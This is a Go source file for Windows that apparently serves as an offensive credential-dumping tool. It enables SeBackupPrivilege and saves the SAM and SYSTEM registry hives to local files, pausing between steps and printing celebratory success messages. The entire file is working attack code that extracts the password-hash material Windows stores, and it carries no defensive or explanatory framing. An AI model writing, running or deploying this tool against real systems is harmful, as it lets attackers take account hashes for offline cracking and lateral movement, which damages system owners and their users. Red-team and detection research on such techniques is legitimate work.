//go:build windows

package main

import (
	"fmt"
	"os"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	hkeyLocalMachine = windows.Handle(0x80000002)
	keyRead          = 0x20019
	regLatestFormat  = 2
)

var (
	advapi32          = windows.NewLazySystemDLL("advapi32.dll")
	procRegCloseKey   = advapi32.NewProc("RegCloseKey")
	procRegOpenKeyExW = advapi32.NewProc("RegOpenKeyExW")
	procRegSaveKeyExW = advapi32.NewProc("RegSaveKeyExW")
)

func enableSeBackupPrivilege() error {
	var err error
	var luid windows.LUID
	var privName *uint16
	var proc windows.Handle
	var token windows.Token
	var tp windows.Tokenprivileges

	proc, err = windows.GetCurrentProcess()
	if err != nil {
		return fmt.Errorf("GetCurrentProcess: %w", err)
	}
	err = windows.OpenProcessToken(
		proc,
		windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY,
		&token,
	)
	if err != nil {
		return fmt.Errorf("OpenProcessToken: %w", err)
	}
	defer token.Close()

	privName, err = windows.UTF16PtrFromString("SeBackupPrivilege")
	if err != nil {
		return err
	}
	err = windows.LookupPrivilegeValue(nil, privName, &luid)
	if err != nil {
		return fmt.Errorf("LookupPrivilegeValue: %w", err)
	}

	tp = windows.Tokenprivileges{
		PrivilegeCount: 1,
		Privileges: [1]windows.LUIDAndAttributes{
			{Luid: luid, Attributes: windows.SE_PRIVILEGE_ENABLED},
		},
	}
	return windows.AdjustTokenPrivileges(token, false, &tp, 0, nil, nil)
}

func executeCredDump(hive string, outPath string) error {
	var err error
	var hKey windows.Handle
	var statErr error

	_, statErr = os.Stat(outPath)
	if statErr == nil {
		fmt.Printf("[*] %s already exists, removing\n", outPath)
		err = os.Remove(outPath)
		if err != nil {
			return fmt.Errorf("removing existing file: %w", err)
		}
	}

	err = enableSeBackupPrivilege()
	if err != nil {
		fmt.Fprintf(
			os.Stderr,
			"[!] failed to enable SeBackupPrivilege"+
				" (run as Administrator): %v\n",
			err,
		)
		os.Exit(1)
	}

	hKey, err = regOpenKeyEx(hkeyLocalMachine, hive, 0, keyRead)
	if err != nil {
		return err
	}
	defer regCloseKey(hKey)

	err = regSaveKeyEx(hKey, outPath, regLatestFormat)
	if err != nil {
		return err
	}

	fmt.Printf("[+] %s hive saved to %s\n", hive, outPath)
	return nil
}

func main() {
	var err error

	time.Sleep(10 * time.Second)

	err = executeCredDump("SAM", "SAM.hive")
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] failed to dump SAM hive: %v\n", err)
		os.Exit(1)
	}

	time.Sleep(10 * time.Second)

	err = executeCredDump("SYSTEM", "SYSTEM.hive")
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] failed to dump SYSTEM hive: %v\n", err)
		os.Exit(1)
	}

	// Dumping SECURITY like this won't work
	// Additional steps are required
	// It may be re-added in the future
	/*
		err = executeCredDump("SECURITY", "SECURITY.hive")
		if err != nil {
			fmt.Fprintf(os.Stderr, "[!] failed to dump SECURITY hive: %v\n", err)
			os.Exit(1)
		}
	*/

	fmt.Println("[+] Done - credential dump completed successfully")
	fmt.Println("[+] WOOOOO! Have a nice Day!")
}

func regCloseKey(hKey windows.Handle) {
	procRegCloseKey.Call(uintptr(hKey))
}

func regOpenKeyEx(
	hKey windows.Handle,
	subKey string,
	options uint32,
	access uint32,
) (windows.Handle, error) {
	var err error
	var r0 uintptr
	var result windows.Handle
	var subKeyPtr *uint16

	subKeyPtr, err = windows.UTF16PtrFromString(subKey)
	if err != nil {
		return 0, err
	}
	r0, _, _ = procRegOpenKeyExW.Call(
		uintptr(hKey),
		uintptr(unsafe.Pointer(subKeyPtr)),
		uintptr(options),
		uintptr(access),
		uintptr(unsafe.Pointer(&result)),
	)
	if r0 != 0 {
		return 0, fmt.Errorf("RegOpenKeyExW: error %d", r0)
	}
	return result, nil
}

func regSaveKeyEx(
	hKey windows.Handle,
	filePath string,
	flags uint32,
) error {
	var err error
	var filePtr *uint16
	var r0 uintptr

	filePtr, err = windows.UTF16PtrFromString(filePath)
	if err != nil {
		return err
	}
	r0, _, _ = procRegSaveKeyExW.Call(
		uintptr(hKey),
		uintptr(unsafe.Pointer(filePtr)),
		0,
		uintptr(flags),
	)
	if r0 != 0 {
		return fmt.Errorf("RegSaveKeyExW: error %d", r0)
	}
	return nil
}
